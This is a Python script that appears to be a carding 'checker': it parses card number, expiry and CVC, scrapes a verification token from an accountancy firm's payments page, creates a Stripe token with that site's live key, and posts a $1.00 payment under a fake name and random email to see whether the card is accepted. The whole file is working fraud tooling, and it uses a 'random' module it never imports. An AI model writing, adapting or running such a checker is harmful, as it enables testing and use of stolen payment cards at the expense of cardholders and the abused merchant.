import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	if "01" in mm or "02" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
		mm = mm.split("0")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)

	headers = {
	    'authority': 'www.pbaccountant.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'referer': 'https://www.google.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'cross-site',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	response = requests.get('https://www.pbaccountant.com.au/payments', headers=headers)
	
	RequestVerificationToken = re.search(r'name="__RequestVerificationToken" type="hidden" value="(.*?)"', response.text).group(1)
	#print(RequestVerificationToken)
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'time_on_page=62388&guid=NA&muid=NA&sid=NA&key=pk_live_NqLPVp9OhWjmctcO4K5egggi&payment_user_agent=stripe.js%2F78ef418&card[name]=Dao+Khao+Saard&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]=20{yy}'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	
	tok = response.json()['id']
	
	headers = {
	    'authority': 'www.pbaccountant.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.pbaccountant.com.au',
	    'referer': 'https://www.pbaccountant.com.au/payments',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    '__RequestVerificationToken': f'{RequestVerificationToken}',
	    'CardTypes': 'Visa, MasterCard, American Express',
	    'PublishableKey': 'pk_live_NqLPVp9OhWjmctcO4K5egggi',
	    'Token': f'{tok}',
	    'TokenCreationErrorMessage': '',
	    'InvoiceNumber': '1',
	    'Amount': '1.00',
	    'EmailAddress': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	    'CardHolderName': 'Dao Khao Saard',
	}
	
	response = requests.post('https://www.pbaccountant.com.au/Payments', headers=headers, data=data)
	
	result = re.search(r'<p class="Callout">(.*?)</p>', response.text).group(1)
	return (result)
